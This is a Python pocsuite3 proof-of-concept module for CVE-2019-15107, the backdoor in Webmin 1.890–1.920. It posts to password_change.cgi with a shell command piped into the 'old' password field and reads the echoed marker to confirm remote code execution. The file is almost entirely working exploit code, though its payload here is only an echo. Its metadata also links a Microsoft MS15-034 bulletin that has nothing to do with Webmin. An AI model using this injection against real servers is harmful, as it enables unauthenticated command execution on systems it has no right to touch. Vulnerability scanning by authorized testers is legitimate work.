#!/usr/bin/env python
# coding: utf-8
from urllib.parse import urlparse
from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

req.packages.urllib3.disable_warnings()


class TestPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = 'jerome'
    vulDate = '2019-8-12'
    createDate = '2020-2-14'
    updateDate = '2020-2-14'
    references = ['https://www.exploit-db.com/exploits/47230']
    name = 'CVE-2019-15107 - Webmin 1.920 - Unauthenticated Remote Code Execution'
    appPowerLink = 'https://docs.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-034'
    appName = 'webmin'
    appVersion = '1.92'
    vulType = VUL_TYPE.CODE_EXECUTION
    category = POC_CATEGORY.EXPLOITS.REMOTE
    desc = '''
        This module exploits a backdoor in Webmin versions 1.890 through 1.920.
        Only the SourceForge downloads were backdoored, but they are listed as
        official downloads on the project's site.

        Unknown attacker(s) inserted Perl qx statements into the build server's
        source code on two separate occasions: once in April 2018, introducing
        the backdoor in the 1.890 release, and in July 2018, reintroducing the
        backdoor in releases 1.900 through 1.920.

        Only version 1.890 is exploitable in the default install. Later affected
        versions require the expired password changing feature to be enabled.
    '''

    def _verify(self):
        result = {}
        pr = urlparse(self.url)
        if pr.port:
            ports = [pr.port]
        else:
            ports = [10000]
        for scheme in ('https','http'):
            for port in ports:
                target = '{}://{}:{}/password_change.cgi'.format(
                    scheme, pr.hostname, port)
                # 定义请求头
                post_cookies = {"redirect": "1", "testing": "1",
                                "sid": "x", "sessiontest": "1"}
                post_headers = {"Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Accept-Language": "en",
                                "User-Agent": "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)", "Connection": "close", "Referer": target, "Content-Type": "application/x-www-form-urlencoded"}
                # 发送带指令的请求数据
                post_data = {"user": "rootxx", "pam": '', "expired": "2",
                            "old": "test|echo 0xdeadbeaf", "new1": "test2", "new2": "test2"}
                response = req.post(target, headers=post_headers,
                                    cookies=post_cookies, data=post_data, verify=False)
                # 根据回显判断目标是否存在漏洞
                if response and response.status_code == 200 and "0xdeadbeaf" in response.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = '{}://{}:{}'.format(
                        scheme,pr.hostname, port)
                    break
        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(TestPOC)
